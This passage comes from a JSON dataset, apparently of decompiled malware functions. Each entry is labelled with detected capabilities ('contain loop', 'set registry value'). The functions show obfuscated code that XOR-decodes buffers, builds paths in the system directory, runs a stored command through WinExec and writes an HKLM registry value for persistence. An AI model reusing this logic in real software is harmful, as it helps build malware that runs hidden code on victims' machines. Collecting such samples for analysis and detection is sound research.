uVar6 = arg_14h ^ uVar6;\n            in_EDX = CONCAT31(iVar3 >> 8, uVar6);\n            *(uVar5 + arg_10h) = uVar6;\n            uVar5 = uVar5 + 1;\n            bVar8 = uVar5 < arg_14h;\n        } while (uVar5 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 624
    },
    "00402f20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402f75) overlaps instruction at (ram,0x00402f73)\n// \n// WARNING: Removing unreachable block (ram,0x00402f60)\n// WARNING: Removing unreachable block (ram,0x00402f66)\n// WARNING: Removing unreachable block (ram,0x00402f67)\n// WARNING: Removing unreachable block (ram,0x00402f6f)\n\nuint __cdecl fcn.00402f20(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = lpBuffer;\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407024, &lpBuffer, arg_8h);\n    fcn.00403890(&var_4h, &var_8h);\n    fcn.00403070(var_4h);\n    iVar1 = fcn.00403600(&s, var_4h, var_8h);\n    if (iVar1 != 0) {\n        fcn.00401000(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 504
    },
    "00403990": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403af6) overlaps instruction at (ram,0x00403aed)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004039db)\n// WARNING: Removing unreachable block (ram,0x004039e9)\n// WARNING: Removing unreachable block (ram,0x004039eb)\n// WARNING: Removing unreachable block (ram,0x00403ce9)\n// WARNING: Removing unreachable block (ram,0x00403b98)\n// WARNING: Removing unreachable block (ram,0x00403d0b)\n// WARNING: Removing unreachable block (ram,0x00403d40)\n// WARNING: Removing unreachable block (ram,0x00403d63)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t * __cdecl fcn.00403990(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t *extraout_ECX_01;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    uint16_t uVar10;\n    int32_t unaff_EBX;\n    uint32_t uVar11;\n    ushort *puVar12;\n    ushort *puVar13;\n    ushort *puVar14;\n    uint uVar15;\n    uint32_t *puVar16;\n    uint *puVar17;\n    uchar *puVar18;\n    uchar *puVar19;\n    ushort in_ES;\n    bool bVar20;\n    char cVar21;\n    bool bVar22;\n    char cVar23;\n    bool bVar24;\n    ulong uVar25;\n    uint32_t uStack552;\n    uchar lpBuffer;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar17 = &var_213h;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar17 = 0;\n        puVar17 = puVar17 + 1;\n    }\n    *puVar17 = 0;\n    *(puVar17 + 2) = 0;\n    s = 0;\n    puVar17 = &var_10fh;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar17 = 0;\n        puVar17 = puVar17 + 1;\n    }\n    *puVar17 = 0;\n    var_ch = 0x1;\n    puVar18 = puVar17 + 3;\n    *(puVar17 + 2) = 0;\n    puVar5 = &lpBuffer;\n    uStack552 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407030, &lpBuffer, arg_8h);\n    fcn.00402a90(&var_4h, &var_8h);\n    uVar25 = fcn.004013a0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    bVar20 = (POPCOUNT(uVar25 & 0xff) & 1U) == 0;\n    if (uVar25 == 0) {\n        return NULL;\n    }\n    if ((bVar20) || (uVar15 = extraout_ECX,  uVar8 = uVar25 >> 0x20,  !bVar20)) {\n        uVar15 = var_8h;\n        uVar8 = var_4h;\n    }\n    *(unaff_EBX + 0x558bf84d) = *(unaff_EBX + 0x558bf84d) | 0xfffffffc;\n    uVar25 = fcn.00403600(&s, uVar8, uVar15);\n    if (uVar25 == 0) {\n        return NULL;\n    }\n    bVar20 = (extraout_ECX_00 & 0xffff0000 | CONCAT11((extraout_ECX_00 >> 8) - unaff_EBX, extraout_ECX_00)) <\n             uVar25 >> 0x20;\n    fcn.00404e90();\n    if ((!bVar20) && (bVar20)) {\n        *(arg_8h + 0x43d1773a) = *(arg_8h + 0x43d1773a) ^ 0x6827e95e;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar6 = fcn.00401220(0x407068);\n    if (iVar6 == -1) {\n        iVar6 = fcn.00401220(0x40705c);\n        if (iVar6 == -1) goto code_r0x00403b6a;\n        uVar15 = 0xf;\n    }\n    else {\n        uVar15 = 0xe;\n    }\n    iVar6 = fcn.00401960(arg_8h);\n    if (iVar6 != 0) {\n        fcn.00401500(uVar15);\n        fcn.00401990(uVar15);\n        return 0x1;\n    }\n    if (*0x422538 == 0) {\n        return NULL;\n    }\ncode_r0x00403b6a:\n    puVar4 = fcn.00401b40(arg_8h, &s);\n    puVar16 = var_ch;\n    if (puVar4 == NULL) {\n        puVar16 = NULL;\n    }\n    bVar20 = puVar16 == NULL;\n    if (!bVar20) {\n        puVar4 = fcn.00402820(arg_8h);\n        bVar20 = puVar4 == NULL;\n        if (bVar20) {\n            var_ch = NULL;\n            puVar16 = puVar4;\n        }\n    }\n    if ((!bVar20) && (bVar20)) {\n        puVar4 = puVar5;\n    }\n    if (puVar16 == NULL) {\n        puVar4 = fcn.004032d0(arg_8h, 0);\n        puVar16 = puVar4;\n        var_ch = puVar4;\n    }\n    cVar23 = false;\n    puVar5 = puVar16;\n    if (puVar16 != NULL) {\n        puVar4 = fcn.00401990();\n        cVar23 = SCARRY4(&stack0xfffffdd4, 4);\n        puVar5 = &uStack552;\n    }\n    cVar21 = puVar5 < 0;\n    if ((!cVar23) && (cVar23)) {\n        LOCK();\n        puVar16 = 0x138b2633;\n        cVar23 = SCARRY4(puVar4, 0x658f517f);\n        cVar21 = puVar4 + 0x658f517f < 0;\n    }\n    puVar5 = (*_sym.imp.KERNEL32.dll_Sleep)();\n    if ((cVar23 == cVar21) && (cVar23 != cVar21)) {\n        uVar9 = *(arg_8h + 0x6a);\n        puVar4 = puVar16 + 0x1f;\n        cVar23 = *puVar4;\n        cVar21 = (extraout_ECX_01 << 0x10) >> 0x18;\n        *puVar4 = *puVar4 + cVar21;\n        if (SCARRY1(cVar23, cVar21)) {\n            uVar3 = puVar16;\n            bVar20 = CARRY1(*puVar16, uVar3);\n            bVar24 = SCARRY1(*puVar16, uVar3);\n            *puVar16 = *puVar16 + uVar3;\n            bVar22 = *puVar16 < '\\0';\n            puVar4 = extraout_ECX_01;\n            puVar13 = &stack0xfffffdd4 ^ uVar9;\n            puVar14 = &stack0xfffffffc;\ncode_r0x00403c98:\n            do {\n                if (!bVar20) {\n                    puVar13[-1] = puVar18;\n                    puVar18 = puVar18 & 0xffff0000 | puVar13[-1];\n                    if (bVar20) {\n                        puVar19 = *puVar16;\n                        *(puVar13 + -2) = 0xb7f8c08b;\n                        if (puVar13 < puVar19 || puVar16 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\n                        puVar12 = puVar13 + -4;\n                        *(puVar13 + -4) = puVar14;\n                        puVar16 = *(puVar13 + 6);\n                        *(puVar13 + -0xe) = arg_8h;\n                        *(puVar13 + -0x10) = puVar5;\n                        *(puVar13 + -0x12) = puVar18;\n                        puVar4 = puVar16 * 2;\n                        *(puVar13 + -8) = 0;\n                        bVar20 = false;\n                        bVar24 = false;\n                        bVar22 = puVar16 < 0;\n                        *(puVar13 + -0xc) = puVar4;\n                        if (puVar16 < 1) {\n                            return puVar16;\n                        }\n                        *(puVar13 + -10) = 1;\n                        puVar13 = puVar13 + -0x12;\n                        puVar14 = puVar12;\n                        goto code_r0x00403c98;\n                    }\n                }\n                iVar6 = *(puVar14 + -8);\n                *(puVar14 + -1) = *(iVar6 + *(puVar14 + 0x10));\n                if (bVar24 == bVar22) {\n                    *(puVar13 + -2) = puVar18;\n                    puVar18 = *(puVar13 + -2);\n                    if (bVar24 != bVar22) {\n                        *puVar13 = in_ES;\n                        puVar5 = puVar5 + -1;\n                        puVar19 = puVar18 | puVar14;\n                        puVar18 = puVar19 + 1;\n                        *puVar19 = iVar6;\n                    }\n                }\n                iVar6 = *(puVar14 + -0xc);\n                iVar7 = *(puVar14 + 0xc);\n                uVar3 = *(iVar6 % iVar7 + *(puVar14 + 8));\n                *(puVar14 + -2) = uVar3;\n                *(puVar13 + -2) = *(puVar14 + 8);\n                *(puVar13 + -4) = puVar4 & 0xffffff00 | uVar3;\n                *(puVar13 + -6) = iVar6 % iVar7;\n                *(puVar13 + -8) = arg_8h;\n                *(puVar13 + -10) = puVar13;\n                *(puVar13 + -0xc) = puVar14;\n                *(puVar13 + -0xe) = puVar5;\n                *(puVar13 + -0x10) = puVar18;\n                puVar14 = *(puVar13 + -0xc);\n                uVar11 = *(puVar13 + -8);\n                iVar6 = *(puVar14 + -0xc);\n                puVar5 = *(puVar14 + 8);\n                iVar7 = (iVar6 + -1) % *(puVar14 + 0xc);\n                uVar3 = *(puVar14 + -1);\n                uVar1 = *(iVar7 + puVar5);\n                puVar13[-1] = uVar11;\n                *(puVar13 + -3) = iVar7;\n                *(puVar13 + -5) = *(puVar13 + -0x10);\n                puVar18 = *(puVar13 + -5);\n                uVar9 = *(puVar13 + -3);\n                uVar10 = puVar13[-1];\n                *(puVar13 + -2) = iVar6;\n                iVar7 = *(puVar13 + -2);\n                uVar2 = *(puVar14 + -0x10);\n                iVar6 = *(puVar14 + 0x18);\n                *(iVar6 + -1 + iVar7) = uVar2 ^ uVar3 ^ uVar1;\n                *(puVar13 + -2) = uVar9 & 0xffffff00 | uVar2;\n                uVar15 = *(puVar13 + -2);\n                arg_8h = uVar11 & 0xffff0000 | uVar10 & 0xffffff00 | *(puVar14 + -2);\n                *(puVar14 + -0xc) = iVar7 + 2;\n                *(iVar7 + iVar6) = uVar15 ^ *(puVar14 + -2);\n                puVar4 = *(puVar14 + 0x14);\n                puVar16 = *(puVar14 + -8) + 1;\n                bVar20 = puVar16 < puVar4;\n                bVar24 = SBORROW4(puVar16, puVar4);\n                bVar22 = puVar16 - puVar4 < 0;\n                *(puVar14 + -8) = puVar16;\n                if (puVar4 <= puVar16) {\n                    return puVar16;\n                }\n            } while( true );\n        }\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c, 0);\n        puVar5 = puVar16;\n    }\n    return puVar5;\n}\n",
        "token_count": 3144
    },
    "00401500": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401500(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    }
}